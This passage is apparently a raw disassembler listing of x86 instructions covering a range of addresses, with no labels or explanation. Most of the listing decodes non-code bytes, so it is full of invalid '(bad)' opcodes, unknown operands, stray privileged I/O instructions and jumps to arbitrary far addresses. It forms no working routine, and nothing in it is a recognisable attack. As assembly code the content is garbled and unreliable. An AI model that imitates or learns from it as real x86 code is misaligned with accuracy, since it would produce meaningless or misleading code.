  4321ed:	xchg   DWORD PTR [esi],ebx
  4321ef:	sbb    eax,0xffffffaa
  4321f2:	mov    ebp,0x65818a5c
  4321f7:	xor    esi,ebp
  4321f9:	aam    0x15
  4321fb:	adc    BYTE PTR [eax-0x2d],cl
  4321fe:	xchg   edx,eax
  4321ff:	jne    0x432258
  432201:	add    bl,dh
  432203:	and    eax,0xab14e4ec
  432208:	dec    ecx
  432209:	popa   
  43220a:	push   ds
  43220b:	std    
  43220c:	cs daa 
  43220e:	fwait
  43220f:	fs ds inc edi
  432212:	int    0x99
  432214:	jecxz  0x4321ef
  432216:	xor    edx,esp
  432218:	lea    ebp,[edi-0x2e]
  43221b:	imul   ebp,DWORD PTR [edx+0x157d1fe9],0xffffffda
  432222:	push   cs
  432223:	(bad)  
  432224:	mov    gs,WORD PTR [esi+edx*2+0x1df4ecc4]
  43222b:	scas   eax,DWORD PTR es:[edi]
  43222c:	jo     0x432246
  43222e:	jmp    0x43227c
  432230:	fiadd  DWORD PTR [ebp+0x5a802ec6]
  432236:	push   ds
  432237:	aaa    
  432238:	add    eax,0xd8a77906
  43223d:	dec    edx
  43223e:	ret    0xe9d4
  432241:	lods   eax,DWORD PTR ds:[esi]
  432242:	add    BYTE PTR [esi],dh
  432244:	imul   esi,DWORD PTR [ecx+0x48],0xdcd189e2
  43224b:	fmul   DWORD PTR [edx+0x54717a15]
  432251:	add    dl,BYTE PTR [edx-0x56]
  432254:	mov    cl,0x5d
  432256:	leave  
  432257:	shr    BYTE PTR ds:0x8ce5ffb3,cl
  43225d:	jmp    0xe73e:0x934a11f
  432264:	inc    esi
  432265:	inc    edx
  432266:	add    cl,BYTE PTR [ebx+0x63a4563c]
  43226c:	mov    ecx,edi
  43226e:	call   0x9f:0x826a8ec7
  432275:	loope  0x43220e
  432277:	aam    0x9f
  432279:	(bad)  
  43227a:	or     bh,BYTE PTR [eax-0x129ef2fb]
  432280:	jmp    0x2d94ae45
  432285:	sbb    BYTE PTR [esi],bh
  432287:	sbb    DWORD PTR [eax],edx
  432289:	jb     0x432237
  43228b:	cmp    DWORD PTR [ebp-0x75dbe2db],eax
  432291:	push   ebp
  432292:	pop    ds
  432293:	xor    eax,0xdbd46bde
  432298:	in     al,dx
  432299:	nop
  43229a:	pop    esi
  43229b:	aad    0x51
  43229d:	sub    DWORD PTR [eax],ebp
  43229f:	adc    esp,ebx
  4322a1:	data16 int 0xe3
  4322a4:	mov    DWORD PTR [ebx],esi
  4322a6:	jnp    0x432314
  4322a8:	sbb    ecx,DWORD PTR [esp+edi*1]
  4322ab:	jl     0x43228c
  4322ad:	add    cl,BYTE PTR [eax+ebp*2-0x5e]
  4322b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322b2:	push   esi
  4322b3:	mov    ?,WORD PTR [edx]
  4322b5:	sbb    ebx,DWORD PTR [edi]
  4322b7:	mov    ecx,0x3a5abdad
  4322bc:	sbb    cl,dl
  4322be:	mov    esp,edx
  4322c0:	fisub  DWORD PTR [edi+0x4e]
  4322c3:	add    ecx,eax
  4322c5:	sbb    BYTE PTR [esi+esi*4],bh
  4322c8:	mov    DWORD PTR [edi-0x6e0e6347],ebx
  4322ce:	sbb    BYTE PTR [edx+0x4a9617a8],0x7
  4322d5:	out    0x56,al
  4322d7:	cdq    
  4322d8:	dec    ecx
  4322d9:	dec    eax
  4322da:	retf   0xe03b
  4322dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322de:	outs   dx,BYTE PTR ds:[esi]
  4322df:	sub    ecx,DWORD PTR [ebp-0x5416e674]
  4322e5:	mov    WORD PTR [eax+0xb],cs
  4322e8:	or     dh,al
  4322ea:	dec    edx
  4322eb:	add    BYTE PTR [ebp+0x3],dl
  4322ee:	and    BYTE PTR [ebp+0x78d98b83],0x0
  4322f5:	xlat   BYTE PTR ds:[ebx]
  4322f6:	pusha  
  4322f7:	push   edi
  4322f8:	div    ebp
  4322fa:	jae    0x432306
  4322fc:	in     eax,0x4a
  4322fe:	nop
  4322ff:	jl     0x4322bd
  432301:	retf   
  432302:	out    dx,eax
  432303:	aam    0x75
  432305:	(bad)  
  432306:	mov    esp,0xbf731302
  43230b:	or     BYTE PTR [eax-0x46e0eab3],0x68
  432312:	aas    
  432313:	cs stos BYTE PTR es:[edi],al
  432315:	add    eax,0xd05b2726
  43231a:	mov    gs,WORD PTR [ebx+0x391fa30a]
  432320:	adc    eax,0xfab66b4a
  432325:	call   0xd6a0:0x37aad456
  43232c:	fcomi  st,st(3)
  43232e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43232f:	shl    BYTE PTR [ebp-0x768d05d9],0x1b
  432336:	xor    al,0x5d
  432338:	loop   0x4322e8
  43233a:	fnstenv [ecx-0x47f8ca64]
  432340:	mov    ds:0x4e5e1f82,al
  432345:	pop    es
  432346:	mov    bl,0xac
  432348:	mov    cl,0x57
  43234a:	mov    al,BYTE PTR [ebx]
  43234c:	or     cl,bl
  43234e:	mov    ebp,0xb65f44b5
  432353:	aam    0x4c
  432355:	adc    al,0x98
  432357:	add    BYTE PTR [eax-0x27],al
  43235a:	xchg   dl,cl
  43235c:	mov    bl,ah
  43235e:	push   esi
  43235f:	adc    ebx,DWORD PTR [edi+0x35728992]
  432365:	add    esi,esp
  432367:	xlat   BYTE PTR ds:[ebx]
  432368:	int    0x8
  43236a:	or     dh,BYTE PTR [ebx+eax*1-0x7652f0e7]
  432371:	mov    ch,0x75
  432373:	jns    0x43234a
  432375:	cmp    bl,al
  432377:	xchg   ebx,eax
  432378:	mov    al,ds:0x19ee5e02
  43237d:	sti    
  43237e:	pop    edx
  43237f:	pop    sp
  432381:	in     al,dx
  432382:	jnp    0x432399
  432384:	push   0xffffff80
  432386:	loop   0x43235d
  432388:	stos   BYTE PTR es:[edi],al
  432389:	fsubr  QWORD PTR [edx-0x2de327e7]
  43238f:	xchg   esp,eax
  432390:	mov    dl,0x13
  432392:	out    dx,eax
  432393:	jne    0x4323ae
  432395:	ja     0x432366
  432397:	add    esp,DWORD PTR [ebp-0x778ff389]
  43239d:	sub    esi,ebp
  43239f:	hlt    
  4323a0:	cmp    bh,BYTE PTR [ebx]
  4323a2:	mov    cl,0x9f
  4323a4:	sub    BYTE PTR [esi-0x18],0xab
  4323a8:	xor    DWORD PTR [eax+0x45],eax
  4323ab:	jne    0x4323d7
  4323ad:	lods   eax,DWORD PTR gs:[esi]
  4323af:	pop    esp
  4323b0:	js     0x4323bf
  4323b2:	pop    ds
  4323b3:	iret   
  4323b4:	pop    esi
  4323b5:	push   edx
  4323b6:	dec    esi
  4323b7:	frstor [eax+0x37aa56d1]
  4323bd:	ret    0x9f5
  4323c0:	(bad)  
  4323c1:	gs loopne 0x4323ba
  4323c4:	pop    edi
  4323c5:	pop    ebx
  4323c6:	and    ax,0x48d7
  4323ca:	add    cl,BYTE PTR ss:[eax+0x43cc0b3c]
  4323d1:	add    bh,BYTE PTR [ebx+ebx*2]
  4323d4:	popf   
  4323d5:	mov    ebp,ebp
  4323d7:	lea    ebp,[esi-0x5]
  4323da:	pop    ds
  4323db:	ja     0x4323f7
  4323dd:	outs   dx,BYTE PTR ds:[esi]
  4323de:	cs inc esi
  4323e0:	adc    BYTE PTR [edx-0x2c1a552c],0xa8
  4323e7:	add    eax,0xd54c3a63
  4323ec:	imul   ebp,DWORD PTR [eax+ecx*8-0x1a406bf],0x7e7abd4
  4323f7:	xor    edx,esi
  4323f9:	mov    WORD PTR ds:0xf9f8f8d4,es
  4323ff:	enter  0xab0d,0xba
  432403:	mov    al,0x30
  432405:	(bad)  
  432406:	in     al,dx
  432407:	aad    0x47
  432409:	mov    eax,ds:0x66ba30cc
  43240e:	addr16 aam 0xbc
  432411:	out    0x5d,eax
  432413:	or     ebx,DWORD PTR [ebp-0x4f445d06]
  432419:	cmp    DWORD PTR [eax],eax
  43241b:	in     eax,dx
  43241c:	rol    bh,1
  43241e:	popa   
  43241f:	leave  
  432420:	pop    ss
  432421:	data16 adc BYTE PTR [ebx],ah
  432424:	push   0xa3d439d2
  432429:	out    dx,eax
  43242a:	nop
  43242b:	rol    DWORD PTR [eax],cl
  43242d:	and    eax,0x4988e811
  432432:	daa    
  432433:	dec    esi
  432434:	gs call 0x118f9dfe
  43243a:	(bad)  
  43243b:	rcr    eax,1
  43243d:	out    dx,al
  43243e:	sbb    eax,0x29de7ad1
  432443:	cmp    BYTE PTR cs:[ebx+0x18],ch
  432447:	aam    0xa9
  432449:	in     al,dx
  43244a:	(bad)  
  43244b:	mov    bl,0xbd
  43244d:	inc    esp
  43244e:	cli    
  43244f:	iret   
  432450:	test   DWORD PTR [ebx],0x2d53d408
  432456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432457:	add    BYTE PTR [ecx+0x13b45f35],0x34
  43245e:	aas    
  43245f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432460:	mov    BYTE PTR [edi-0x34],ah
  432463:	cmp    cl,BYTE PTR [ebx-0x33993616]
  432469:	add    al,BYTE PTR [esi-0x23b8e16f]
  43246f:	(bad)  
  432471:	sbb    BYTE PTR [edi],0x45
  432474:	mov    al,ds:0xc80d3894
  432479:	(bad)  
  43247a:	into   
  43247b:	aad    0x8e
  43247d:	out    0xa6,eax
  43247f:	(bad)  
  432480:	imul   ecx,ecx,0x14
  432483:	aas    
  432484:	mov    DWORD PTR [ebx-0x73],ebx
  432487:	jae    0x4324aa
  432489:	fst    DWORD PTR [ebp+0x7e]
  43248c:	jnp    0x43248e
  43248e:	push   ss
  43248f:	push   ds
  432490:	push   cs
  432491:	fisttp QWORD PTR [esi]
  432493:	inc    eax
  432494:	lea    ecx,ds:0x7dfb3626
  43249a:	stc    
  43249b:	aad    0x72
  43249d:	stc    
  43249e:	fsub   st(6),st
  4324a0:	in     eax,0x2a
  4324a2:	ins    DWORD PTR es:[edi],dx
  4324a3:	pop    esp
  4324a4:	push   0x79
  4324a6:	or     al,0xd7
  4324a8:	mov    WORD PTR [esi],ds
  4324aa:	xchg   al,dh
  4324ac:	out    dx,al
  4324ad:	push   ebx
  4324ae:	jmp    0xdf2b:0x338b8827
  4324b5:	(bad)  
  4324b6:	out    dx,eax
  4324b7:	dec    ebx
  4324b8:	mov    ah,ch
  4324ba:	sub    cl,BYTE PTR [eax-0x2bae9b7c]
  4324c0:	pop    edx
  4324c1:	mov    eax,ds:0x389a4728
  4324c6:	push   ds
  4324c7:	loope  0x43244f
  4324c9:	push   ds
  4324ca:	out    0xf1,al
  4324cc:	add    BYTE PTR [ecx+0x340cd7be],ch
  4324d2:	daa    
  4324d3:	outs   dx,BYTE PTR ds:[esi]
  4324d4:	repz retf 
  4324d6:	lods   eax,DWORD PTR ds:[esi]
  4324d7:	je     0x43246b
  4324d9:	ret    0xeb1f
  4324dc:	daa    
  4324dd:	inc    ebx
  4324de:	es lahf 
  4324e0:	dec    esp
  4324e1:	or     al,0x5c
  4324e3:	stos   BYTE PTR es:[edi],al
  4324e4:	lahf   
  4324e5:	jo     0x432551
  4324e7:	pusha  
  4324e8:	inc    ebx
  4324e9:	ret    0xbee1
  4324ec:	cmp    ebp,DWORD PTR [edx-0x4a42d085]
  4324f2:	stos   BYTE PTR es:[edi],al
  4324f3:	push   esp
  4324f4:	pop    ebx
  4324f5:	pop    edi
  4324f6:	xchg   esp,eax
  4324f7:	es retf 0x5405
  4324fb:	jmp    0x432483
  4324fd:	push   cs
  4324fe:	std    
  4324ff:	mov    fs,WORD PTR [ebp-0x69]
  432502:	mov    cx,0xe69d
  432506:	test   DWORD PTR [esi-0x2dcb0d58],ebx
  43250c:	sbb    al,0x2
  43250e:	mov    BYTE PTR [edi],dl
  432510:	mov    edx,0x6185a983
  432515:	(bad)  
  432516:	arpl   WORD PTR [ebp+0x3914bf73],dx
  43251c:	inc    dl
  43251e:	into   
  43251f:	inc    esi
  432520:	mov    DWORD PTR [esp+ecx*8],edx
  432523:	jmp    0x61fb:0xf565a181
  43252a:	mov    ds:0x8733b4f4,eax
  43252f:	ror    DWORD PTR [edx-0xf700624],1
  432535:	and    al,0x37
  432537:	(bad)  
  432538:	fld    QWORD PTR ds:0x4b467e18
  43253e:	repnz xchg edx,eax
  432540:	inc    esp
  432541:	sbb    bl,BYTE PTR [esi]
  432543:	add    DWORD PTR [esi+0x70],esp
  432546:	xor    al,0x7a
  432548:	sub    dl,ah
  43254a:	lods   al,BYTE PTR ds:[esi]
  43254b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43254c:	mov    ds:0x96db0fe0,al
  432551:	in     al,dx
  432552:	and    dl,ch
  432554:	pop    ebp
  432555:	or     ebp,DWORD PTR [edx-0x58880651]
  43255b:	cmp    eax,0x9dfc026f
  432560:	aam    0xb0
  432562:	arpl   bp,cx
  432564:	dec    edi
  432565:	add    esp,esi
  432567:	jns    0x432558
  432569:	xchg   esi,eax
  43256a:	add    eax,0x653f1caf
  43256f:	out    0x1f,eax
  432571:	push   edi
  432572:	sbb    edx,edx
  432574:	adc    eax,0x999d9753
  432579:	add    bh,BYTE PTR [esi-0x1614b02f]
  43257f:	push   ebx
  432580:	call   0xef7d:0x7387629a
  432587:	sub    ch,BYTE PTR [ecx+0x48b6f082]
  43258d:	add    al,BYTE PTR [esi]
  43258f:	and    BYTE PTR [edx-0x5ef69542],0x2e
  432596:	push   ds
  432597:	in     eax,dx
  432598:	call   0xaceb:0xec1cc9f0
  43259f:	aad    0xdf
  4325a1:	jo     0x4325fa
  4325a3:	jmp    0x43255a
  4325a5:	les    esp,FWORD PTR [edi-0x30fc770c]
  4325ab:	stos   DWORD PTR es:[edi],eax
  4325ac:	sub    eax,0x68543334
  4325b1:	jmp    0x43254f
  4325b3:	aad    0xc6
  4325b5:	icebp  
  4325b6:	dec    eax
  4325b7:	push   ecx
  4325b8:	dec    esi
  4325b9:	fstp   TBYTE PTR [ebp-0x28]
  4325bc:	mov    DWORD PTR [ebp-0x7be9681e],ecx
  4325c2:	pop    es
  4325c3:	out    0x27,al
  4325c5:	sbb    al,0xbe
  4325c7:	or     DWORD PTR [ebx+0x1f],ecx
  4325ca:	xor    ebp,DWORD PTR ds:0xf4d85688
  4325d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4325d1:	add    DWORD PTR [ecx+0x47299e8c],0xffffffd7
  4325d8:	cmp    bl,BYTE PTR [eax-0xce7d4b1]
  4325de:	xlat   BYTE PTR ss:[ebx]
  4325e0:	in     eax,0xa8
  4325e2:	(bad)  
  4325e3:	push   es
  4325e4:	enter  0x1417,0x74
  4325e8:	mov    ecx,edi
  4325ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4325eb:	cli    
  4325ec:	mov    esp,0x69507b82
  4325f1:	add    dh,BYTE PTR [eax-0x2585e355]
  4325f7:	jecxz  0x432609
  4325f9:	xchg   ebp,eax
  4325fa:	add    WORD PTR [esi+0x42],cx
  4325fe:	rcl    al,1
  432600:	les    esp,FWORD PTR [edx-0x69]
  432603:	data16 (bad) 
  432605:	ins    DWORD PTR es:[edi],dx
  432606:	jle    0x432668
  432608:	std    
  432609:	add    cl,dl
  43260b:	mov    al,ds:0x6058de3d
  432610:	mov    edi,eax
  432612:	xchg   esp,eax
  432613:	pop    esp
  432614:	ficom  DWORD PTR [ebx]
  432616:	fwait
  432617:	jb     0x432640
  432619:	add    al,BYTE PTR [edx+0x767f5bea]
  43261f:	pop    edi
  432620:	xchg   edi,eax
  432621:	xchg   ebx,eax
  432622:	adc    bh,BYTE PTR [eax]
  432624:	mov    bl,dl
  432626:	jmp    0x43264a
  432628:	cmp    al,0x12
  43262a:	push   es
  43262b:	or     eax,DWORD PTR [eax+0x3]
  43262e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43262f:	cmp    ecx,DWORD PTR [ecx+0x628a0c26]
  432635:	stos   BYTE PTR es:[edi],al
  432636:	inc    bp
  432638:	cmp    ch,ah
  43263a:	shl    DWORD PTR [ebx-0x13],0x55
  43263e:	jecxz  0x432635
  432640:	pop    ds
  432641:	add    ecx,DWORD PTR [esi]
  432643:	aas    
  432644:	mov    ds:0xffba81bd,eax
  432649:	call   0x1bfbf96d
  43264e:	repz es int3 
  432651:	sbb    bl,0xd0
  432654:	cmp    al,0x15
  432656:	mov    ecx,0x20ab8140
  43265b:	add    al,0x15
  43265d:	loop   0x4325fa
  43265f:	out    0xa0,eax
  432661:	add    eax,0x193a3555
  432666:	mov    WORD PTR ds:0x798af2af,es
  43266c:	push   eax
  43266d:	shl    BYTE PTR [eax+edi*4+0x3a],cl
  432671:	pop    eax
  432672:	pop    ds
  432673:	retf   
  432674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432675:	xor    dl,ch
  432677:	inc    ecx
  432678:	mov    DWORD PTR [edi-0x1c],esp
  43267b:	sbb    al,0xd7
  43267d:	mov    dh,0x0
  43267f:	shr    cl,1
  432681:	add    eax,0xda44a0e8
  432686:	cwde   
  432687:	out    0x6a,eax
  432689:	add    DWORD PTR [edx],edx
  43268b:	test   eax,0x3b9dcd89
  432690:	(bad)  
  432691:	icebp  
  432692:	enter  0x59a5,0xdb
  432696:	call   0x7f194bc0
  43269b:	imul   DWORD PTR [esi-0x6a298beb]
  4326a1:	sbb    DWORD PTR [edi+0x1b8b2f55],0x1f086b6a
  4326ab:	stc    
  4326ac:	in     al,dx
  4326ad:	lock fisubr DWORD PTR [eax-0x2a1647e8]
  4326b4:	xchg   ebp,eax
  4326b5:	inc    ebx
  4326b6:	cs jl  0x4326ac
  4326b9:	jl     0x432707
  4326bb:	es mov bh,0x3d
  4326be:	dec    ecx
  4326bf:	xor    ecx,DWORD PTR [esi]
  4326c1:	arpl   WORD PTR [edi],dx
  4326c3:	inc    ecx
  4326c4:	dec    esp
  4326c5:	jnp    0x432728
  4326c7:	cs inc esi
  4326c9:	mov    eax,0x23062120
  4326ce:	(bad)
  4326d1:	test   DWORD PTR [ebx+0x657c9f94],esp
  4326d7:	pop    ebx
  4326d8:	repnz add ebx,esi
  4326db:	aad    0xf2
  4326dd:	cwde   
  4326de:	nop
  4326df:	scas   al,BYTE PTR es:[edi]
  4326e0:	dec    eax
  4326e1:	inc    edi
  4326e2:	cmc    
  4326e3:	aad    0x33
  4326e5:	and    ah,ch
  4326e7:	add    esp,DWORD PTR [ecx]
  4326e9:	jmp    0x4326ea
  4326eb:	aaa    
  4326ec:	mov    BYTE PTR [ecx-0x4],ah
  4326ef:	lahf   
  4326f0:	add    bh,bl
  4326f2:	lock mov BYTE PTR [edx+eax*1+0x47f430e],cl
  4326fa:	jl     0x4326e2
  4326fc:	mov    ds:0x5c79ab7e,al
  432701:	(bad)  
  432702:	outs   dx,BYTE PTR ds:[esi]
  432703:	add    DWORD PTR [edi+0x20ed3fef],ebp
  432709:	adc    BYTE PTR [eax],ah
  43270b:	xlat   BYTE PTR ds:[ebx]
  43270c:	imul   ebx,ebp,0x9eb46ff8
  432712:	xchg   DWORD PTR [edi],esp
  432714:	mov    bh,0x1b
  432716:	jns    0x432756
  432718:	or     BYTE PTR [edi+ebp*4],cl
  43271b:	lock arpl WORD PTR [edx],dx
  43271e:	xor    eax,esi
  432720:	daa    
  432721:	push   0xffffffc4
  432723:	fldcw  WORD PTR [ebp+0x5fd7a000]
  432729:	xchg   ecx,eax
  43272a:	(bad)  
  43272c:	lds    esp,FWORD PTR [esi-0x142ef83d]
  432732:	repz fdivr st(4),st
  432735:	add    al,ch
  432737:	fidiv  WORD PTR [esi-0xd]
  43273a:	mov    eax,0x6dc232d0
  43273f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432740:	mov    edi,esi
  432742:	push   eax
  432743:	xchg   ecx,eax
  432744:	mov    ch,0x60
  432746:	xchg   ebx,eax
  432747:	mov    ds:0x15f20321,al
  43274c:	push   ss
  43274d:	inc    eax
  43274e:	pop    ecx
  43274f:	shl    DWORD PTR [esi-0x5d56e0a9],1
  432755:	adc    ch,ah
  432757:	pop    edi
  432758:	fs inc ebx
  43275a:	or     dl,ah
  43275c:	jne    0x432737
  43275e:	(bad)  
  43275f:	sub    bh,dh
  432761:	mov    eax,0xd89d88b
  432766:	jg     0x432768
  432768:	sub    BYTE PTR [edi-0xe37236a],0xdf
  43276f:	(bad)  
  432770:	dec    esi
  432771:	ins    BYTE PTR es:[edi],dx
  432772:	and    esp,DWORD PTR ds:0x1f1407d6
  432778:	add    DWORD PTR [ebx],ecx
  43277a:	pop    ds
  43277b:	sbb    ecx,DWORD PTR ds:0x48d36a68
  432781:	and    al,0x66
  432783:	aad    0x83
  432785:	retf   
  432786:	std    
  432787:	jbe    0x432792
  432789:	sar    DWORD PTR gs:[esi+0x4e7595c1],cl
  432790:	xchg   edi,eax
  432791:	aaa    
  432792:	ret    0xe413
  432795:	addr16 add al,0x47
  432798:	mov    gs,esi
  43279a:	test   eax,0x8da51fd5
  43279f:	test   DWORD PTR [ebp-0x76935f33],esi
  4327a5:	sbb    eax,0x7356d00d
  4327aa:	and    ecx,ebx
  4327ac:	sub    DWORD PTR [edx+esi*2],edx
  4327af:	and    al,0x9c
  4327b1:	jmp    0x4327d6
  4327b3:	hlt    
  4327b4:	repz gs lahf 
  4327b7:	or     ecx,DWORD PTR [eax+0x2339111d]
  4327bd:	and    DWORD PTR ds:0xae24a0d1,edi
  4327c3:	xor    al,0xa4
  4327c5:	jnp    0x432765
  4327c7:	sub    al,0xcc
  4327c9:	xchg   edi,eax
  4327ca:	(bad)  
  4327cb:	cmp    edi,DWORD PTR [eax]
  4327cd:	and    ah,al
  4327cf:	mov    ds:0xd5c32479,al
  4327d4:	xchg   ecx,eax
  4327d5:	pop    eax
  4327d6:	push   es
  4327d7:	or     ch,BYTE PTR [ecx]
  4327d9:	and    eax,0x1cde7474
  4327de:	pop    esi
  4327df:	out    dx,eax
  4327e0:	pop    edx
  4327e1:	mov    al,0x17
  4327e3:	hlt    
  4327e4:	mov    cl,al
  4327e6:	aaa    
  4327e7:	sub    ebp,ebp
  4327e9:	xchg   esp,eax
  4327ea:	daa    
  4327eb:	and    al,0x5f
  4327ed:	adc    al,0x14
  4327ef:	sbb    BYTE PTR [edx+0x3b],ch
  4327f2:	dec    esp
  4327f3:	push   esp
  4327f4:	sti    
  4327f5:	int    0xd6
  4327f7:	mov    ebp,0x18c9dbb4
  4327fc:	lock sbb al,0x61
  4327ff:	inc    ecx
  432800:	mov    esi,0x486bda76
  432805:	(bad)  
  432807:	mov    cl,0x2
  432809:	xchg   edx,eax
  43280a:	and    DWORD PTR [ebx],edi
  43280c:	mov    BYTE PTR [edi+0x4],dl
  43280f:	pop    eax
  432810:	int    0xf8
  432812:	out    0x8d,al
  432814:	xchg   BYTE PTR [ebp+0x59a2bd95],cl
  43281a:	pop    esi
  43281b:	xchg   BYTE PTR [esi-0xb],bl
  43281e:	mov    bl,0xb9
  432820:	stos   DWORD PTR es:[edi],eax
  432821:	stos   BYTE PTR es:[edi],al
  432822:	pop    esi
  432823:	add    BYTE PTR [ecx+0x74bf396f],cl
  432829:	fisub  DWORD PTR [eax-0x55]
  43282c:	enter  0x563e,0x11
  432830:	mov    ds:0x8dc283b0,eax
  432835:	pop    ds
  432836:	adc    al,0xd7
  432838:	add    BYTE PTR [edi-0x3b],0xd8
  43283c:	jns    0x43288f
  43283e:	jecxz  0x432864
  432840:	(bad)  
  432841:	icebp  
  432842:	jo     0x4327d1
  432844:	jbe    0x43287e
  432846:	ins    BYTE PTR es:[edi],dx
  432847:	push   ebx
  432848:	mov    ds:0x68e10f40,al
  43284d:	mov    BYTE PTR [edx+0x1a5af2d4],0x9a
  432854:	sub    cl,dh
  432856:	clc    
  432857:	push   edi
  432858:	mov    ebp,esp
  43285a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43285b:	(bad)  
  43285c:	xor    BYTE PTR [edx],ah
  43285e:	iret   
  43285f:	mov    WORD PTR [eax+0xf],?
  432862:	imul   edx,esp,0xfffffff1
  432865:	jo     0x432895
  432867:	xchg   esp,eax
  432868:	iret   
  432869:	xchg   DWORD PTR [ecx-0x6f],edi
  43286c:	mov    ecx,edi
  43286e:	and    eax,0xf429c328
  432873:	pushf  
  432874:	ja     0x43287a
  432876:	sub    eax,DWORD PTR [edi+eiz*1+0x7c]
  43287a:	push   ds
  43287b:	cmp    DWORD PTR [eax+0x43],edi
  43287e:	pusha  
  43287f:	add    al,cl
  432881:	sbb    cl,BYTE PTR [esi-0x7cfc9b13]
  432887:	xor    BYTE PTR [eax],cl
  432889:	aas    
  43288a:	mov    eax,ds:0x8bfccebf
  43288f:	adc    eax,0x20b04a2b
  432894:	dec    ebx
  432895:	sub    BYTE PTR [ebx],0xa0
  432898:	stc    
  432899:	(bad)  
  43289a:	fisubr DWORD PTR [ecx-0x78]
  43289d:	jmp    0x4328d2
  43289f:	cmp    ecx,esi
  4328a1:	mov    ch,0x20
  4328a3:	pop    edx
  4328a4:	pop    ebp
  4328a5:	add    dl,BYTE PTR [eax-0x2fb46f39]
  4328ab:	js     0x43290f
  4328ad:	adc    eax,0x73895b2a
  4328b2:	popa   
  4328b3:	cs and al,0xba
  4328b6:	push   cs
  4328b7:	sub    esp,0x3
  4328ba:	cli    
  4328bb:	jo     0x4328a5
  4328bd:	imul   ebp,DWORD PTR [ecx],0xffffff9a
  4328c0:	or     edx,ebx
  4328c2:	sbb    al,ch
  4328c4:	mov    BYTE PTR [ebx+0x52],al
  4328c7:	mov    dh,0xf8
  4328c9:	mov    dh,0x49
  4328cb:	adc    BYTE PTR [edx-0xa2934db],ah
  4328d1:	pop    eax
  4328d2:	shl    DWORD PTR [edi+0x34e8a574],0x3
  4328d9:	jl     0x432938
  4328db:	mov    ecx,0xb3fb49c5
  4328e0:	pop    esi
  4328e1:	vpunpckhbw xmm6,xmm3,XMMWORD PTR [esi+eax*4]
  4328e6:	lods   eax,DWORD PTR ds:[esi]
  4328e7:	adc    al,0x5e
  4328e9:	loop   0x4328d1
  4328eb:	mov    ebx,0xd1b59988
  4328f0:	sub    BYTE PTR [esi+0x15],dh
  4328f3:	push   edi
  4328f4:	mov    ebp,0x56ff941c
  4328f9:	xor    al,0x5e
  4328fb:	daa    
  4328fc:	mov    ecx,0x8957c702
  432901:	test   eax,0x3dedef57
  432906:	dec    esi
  432907:	mov    ?,WORD PTR [ebx-0x615155fe]
  43290d:	pop    ecx
  43290e:	adc    esi,DWORD PTR fs:[ebx]
  432911:	cmp    al,0x5f
  432913:	mov    ah,0xb8
  432915:	add    ebx,DWORD PTR [esi]
  432917:	out    0xa6,eax
  432919:	jno    0x432966
  43291b:	cmp    al,0x41
  43291d:	xor    al,0x95
  43291f:	test   bh,bl
  432921:	add    dl,BYTE PTR [eax+0x4f]
  432924:	dec    ecx
  432925:	loopne 0x43292f
  432927:	and    DWORD PTR [eax+0x4e791f59],esi
  43292d:	xchg   esp,eax
  43292e:	sub    al,0x38
  432930:	xlat   BYTE PTR ds:[ebx]
  432931:	(bad)  
  432932:	int    0x34
  432934:	inc    eax
  432935:	pusha  
  432936:	cdq    
  432937:	rcl    DWORD PTR [ecx],cl
  432939:	das    
  43293a:	xchg   BYTE PTR [esi+0x405e47bb],ch
  432940:	mul    edi
  432942:	pop    ds
  432943:	push   ebp
  432944:	lods   al,BYTE PTR ds:[esi]
  432945:	repz inc esi
  432947:	test   eax,0xaaed64e6
  43294c:	dec    ebp
  43294d:	sub    ecx,esp
  43294f:	jle    0x4328f9
  432951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432952:	and    DWORD PTR [ecx-0x1ee0c952],0x48140b9e
  43295c:	stos   BYTE PTR es:[edi],al
  43295d:	mov    al,ds:0xf6cbbfe
  432962:	sub    bl,BYTE PTR [eax+0x49]
  432965:	mov    BYTE PTR [ecx+0x1e5ea758],bl
  43296b:	jnp    0x4329ce
  43296d:	rcr    edi,1
  43296f:	les    esp,FWORD PTR [edx+0x29]
  432972:	mov    esp,fs
  432974:	add    esp,DWORD PTR ss:[eax-0xf55ff91]
  43297b:	or     BYTE PTR [edx+0x6e],0x6c
  43297f:	gs aam 0xc9
  432982:	dec    esp
  432983:	jno    0x43296d
  432985:	test   BYTE PTR [esi+0x7b],bh
  432988:	and    eax,0x1d01e202
  43298d:	pop    edx
  43298e:	mov    ds:0x68556a65,eax
  432993:	fist   DWORD PTR [edi]
  432995:	std    
  432996:	dec    ecx
  432997:	in     eax,dx
  432998:	mov    BYTE PTR [ecx-0x499f4d9c],ch
  43299e:	or     edx,edx
  4329a0:	sbb    ah,BYTE PTR [edx]
  4329a2:	add    BYTE PTR [edi+0x0],ch
  4329a5:	mov    gs,WORD PTR [edi]
  4329a7:	loope  0x4329e8
  4329a9:	add    ah,BYTE PTR [ecx+0x3f]
  4329ac:	imul   edi,DWORD PTR [eax+ebx*1-0x2869c6ca],0x4a1560ac
  4329b7:	pop    edx
  4329b8:	sbb    eax,0x87b57761
  4329bd:	xchg   edi,edi
  4329bf:	push   edi
  4329c0:	mov    BYTE PTR [ebp-0x4e9c7835],ch
  4329c6:	out    dx,al
  4329c7:	fst    st(5)
  4329c9:	add    eax,0x3e1282b2
  4329ce:	or     al,0xde
  4329d0:	cmp    esp,0x68
  4329d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4329d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4329d5:	pop    ebp
  4329d6:	jl     0x432a4a
  4329d8:	mov    DWORD PTR [eax+0x2c9d41e1],edx
  4329de:	jle    0x432a2d
  4329e0:	mov    fs,edi
  4329e2:	pop    ds
  4329e3:	sbb    al,0xa
  4329e5:	sbb    eax,0xb5896d47
  4329ea:	dec    edx
